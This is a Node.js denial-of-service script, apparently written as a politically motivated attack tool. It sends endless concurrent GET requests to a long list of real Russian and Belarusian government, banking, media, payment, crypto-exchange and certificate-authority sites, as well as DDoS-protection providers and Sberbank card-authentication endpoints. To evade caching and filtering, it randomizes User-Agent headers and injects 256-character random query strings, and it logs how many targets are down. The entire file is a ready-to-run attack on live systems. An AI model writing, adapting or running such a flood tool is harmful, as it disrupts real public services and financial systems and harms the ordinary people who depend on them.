const axios = require('axios')
const log = require('log4js').getLogger('dos-attack')

axios.defaults.validateStatus = () => true
log.level = 'INFO'

const LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS = 60
const SITE_TIMEOUT_IN_MS = 2000
const CHAR_SET = 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыьэюяABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

const targets = [
  'https://www.gazprom.ru/',
  'https://lukoil.ru/',
  'https://magnit.ru/',
  'https://www.nornickel.com/',
  'https://www.surgutneftegas.ru/',
  'https://www.tatneft.ru/',
  'https://www.evraz.com/ru/',
  'https://nlmk.com/',
  'https://www.sibur.ru/',
  'https://www.severstal.com/',
  'https://www.metalloinvest.com/',
  'https://nangs.org/',
  'https://rmk-group.ru/ru/',
  'https://www.tmk-group.ru/',
  'https://ya.ru/',
  'https://www.polymetalinternational.com/ru/',
  'https://www.uralkali.com/ru/',
  'https://www.eurosib.ru/',
  'https://omk.ru/',
  'https://www.sberbank.ru/',
  'https://www.vtb.ru/',
  'https://www.gazprombank.ru/',
  'https://www.gosuslugi.ru/',
  'https://www.mos.ru/uslugi/',
  'http://kremlin.ru/',
  'http://government.ru/',
  'https://mil.ru/',
  'https://www.nalog.gov.ru/',
  'https://customs.gov.ru/',
  'https://pfr.gov.ru/',
  'https://rkn.gov.ru/',

  'https://109.207.1.118/',
  'https://109.207.1.97/',

  'https://mail.rkn.gov.ru/',
  'https://cloud.rkn.gov.ru/',
  'https://mvd.gov.ru/',
  'https://pwd.wto.economy.gov.ru/',
  'https://stroi.gov.ru/',
  'https://proverki.gov.ru/',

  'https://ria.ru/',
  'https://gazeta.ru/',
  'https://kp.ru/',
  'https://riafan.ru/',
  'https://pikabu.ru/',
  'https://kommersant.ru/',
  'https://mk.ru/',
  'https://yaplakal.com/',
  'https://rbc.ru/',
  'https://bezformata.com/',

  'http://belta.by/',
  'https://sputnik.by/',
  'https://www.tvr.by/',
  'https://www.sb.by/',
  'https://belmarket.by/',
  'https://www.belarus.by/',
  'https://belarus24.by/',
  'https://ont.by/',
  'https://www.024.by/',
  'https://www.belnovosti.by/',
  'https://mogilevnews.by/',
  'https://www.mil.by/',
  'https://yandex.by/',
  'https://www.slonves.by/',
  'http://www.ctv.by/',
  'https://radiobelarus.by/',
  'https://radiusfm.by/',
  'https://alfaradio.by/',
  'https://radiomir.by/',
  'https://radiostalica.by/',
  'https://radiobrestfm.by/',
  'https://www.tvrmogilev.by/',
  'https://minsknews.by/',
  'https://zarya.by/',
  'https://grodnonews.by/',
  'https://rec.gov.by/ru/',
  'https://www.mil.by/',
  'https://www.government.by/',
  'https://president.gov.by/ru/search_results?start=0&end=1646295523&query=_rand_str&match=any&order=asc',
  'https://www.mvd.gov.by/ru/',
  'https://www.kgb.by/ru/',
  'https://www.prokuratura.gov.by/',
  'https://www.nbrb.by/',
  'https://belarusbank.by/',
  'https://brrb.by/',
  'https://bankdabrabyt.by/',
  'https://belinvestbank.by/',
  'https://bgp.by/ru/',
  'https://www.belneftekhim.by/',
  'https://www.bellegprom.by/',
  'https://www.energo.by/',
  'https://belres.by/ru/',
  'https://mininform.gov.by/',

  'https://www.moex.com',

  'https://www.fsb.ru/',

  'https://cleanbtc.ru/',
  'https://bonkypay.com/',
  'https://changer.club/',
  'https://superchange.net/',
  'https://mine.exchange/',
  'https://platov.co/',
  'https://ww-pay.net/',
  'https://delets.cash/',
  'https://betatransfer.org/',
  'https://ramon.money/',
  'https://coinpaymaster.com/',
  'https://bitokk.biz/',
  'https://www.netex24.net/',
  'https://cashbank.pro/',
  'https://flashobmen.com/',
  'https://abcobmen.com/',
  'https://ychanger.net/',
  'https://multichange.net/',
  'https://24paybank.ne/',
  'https://royal.cash/',
  'https://prostocash.com/',
  'https://baksman.org/',
  'https://kupibit.me/',
  'https://abcobmen.com/',
  'https://www.gosuslugi.ru',

  'https://iecp.ru/ep/ep-verification/',
  'https://iecp.ru/ep/uc-list/',
  'https://uc-osnovanie.ru/',
  'http://www.nucrf.ru/',
  'http://www.belinfonalog.ru/',
  'http://www.roseltorg.ru/',
  'http://www.astralnalog.ru/',
  'http://www.nwudc.ru/',
  'http://www.center-inform.ru/',
  'https://kk.bank/UdTs/',
  'http://structure.mil.ru/structure/uc/info.htm',
  'http://www.ucpir.ru/',
  'http://dreamkas.ru/',
  'http://www.e-portal.ru/',
  'http://izhtender.ru/',
  'http://imctax.parus-s.ru/',
  'http://www.icentr.ru/',
  'http://www.kartoteka.ru/',
  'http://rsbis.ru/elektronnaya-podpis',
  'http://www.stv-it.ru/',
  'http://www.crypset.ru/',
  'http://www.kt-69.ru/',
  'http://www.24ecp.ru/',
  'http://kraskript.com/',
  'http://www.y-center.ru/',
  'http://www.rcarus.ru/',
  'http://rk72.ru/',
  'http://squaretrade.ru/',
  'http://ca.gisca.ru/',
  'http://www.otchet-online.ru/',
  'http://udcs.ru/',
  'http://www.cit-ufa.ru/',
  'http://elkursk.ru/',
  'http://www.icvibor.ru/',
  'http://ucestp.ru/',
  'http://mcspro.ru/',
  'http://www.infotrust.ru/',
  'http://epnow.ru/',
  'http://ca.kamgov.ru/',
  'http://mascom-it.ru',
  'http://cfmc.ru',

  'https://ddos-guard.net/ru',
  'https://stormwall.pro/',
  'https://qrator.net/ru/',
  'https://solidwall.ru/',

  'https://scr.online.sberbank.ru/api/fl/idgib-w-3ds/',
  'https://3dsec.sberbank.ru/mportal3/auth/login/',
  'https://acs1.sbrf.ru/',
  'https://acs2.sbrf.ru/',
  'https://acs3.sbrf.ru/',
  'https://acs4.sbrf.ru/',
  'https://acs5.sbrf.ru/',
  'https://acs6.sbrf.ru/',
  'https://acs7.sbrf.ru/',
  'https://acs8.sbrf.ru/'
]

function isDown (lastSuccessfulResponseTime) {
  const currentTime = Date.now()
  return Math.abs(currentTime - lastSuccessfulResponseTime) > LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS * 1000
}

function randomString (len) {
  let randomString = ''
  for (let i = 0; i < len; i++) {
    const randomPosition = Math.floor(Math.random() * CHAR_SET.length)
    randomString += CHAR_SET.substring(randomPosition, randomPosition + 1)
  }
  return randomString
}

function prepareUrl (url) {
  const preparedUrl = url.replace(/_rand_str/g, randomString(256))
  log.debug(preparedUrl)
  return preparedUrl
}

async function main () {
  log.info('Starting to DoS russian/belarusian gov sites')

  let totalRequests = 0
  const requests = targets.reduce((res, target) => {
    res[target] = { requests: 0, successfulResponses: 0, lastSuccessfulResponseTime: Date.now() }
    return res
  }, {})

  setInterval(() => {
    const downSites = []
    const upSites = []
    Object.entries(requests).forEach(([url, r]) => isDown(r.lastSuccessfulResponseTime) ? downSites.push(url) : upSites.push(url))
    log.info(`Total down sites: ${downSites.length}/${Object.keys(requests).length}`)
    if (upSites.length !== 0 && upSites.length < 20) {
      log.info(`Up site names: ${upSites.join(', ')}`)
    }
    log.info(`Total request count: ${totalRequests}`)
  }, 10000)

  while (true) {
    const responses = await axios.all(Object.keys(requests).map(url => axios({
      method: 'get',
      timeout: SITE_TIMEOUT_IN_MS,
      headers: { 'User-Agent': Math.random().toString(34).slice(2) }, // random string 11 symbols length
      url: prepareUrl(url)
    }).catch((e) => {
      requests[url].requests++
    })))

    totalRequests += responses.length

    responses.forEach(r => {
      if (!r) return

      const url = r.config.url
      requests[url].requests++
      if (r.status === 200) {
        requests[url].successfulResponses++
        requests[url].lastSuccessfulResponseTime = Date.now()
      }
    })

    await new Promise(resolve => setTimeout(resolve, 100)) // delay for releasing event-loop for printing logo
  }
}

main().catch(e => log.error(e.stack))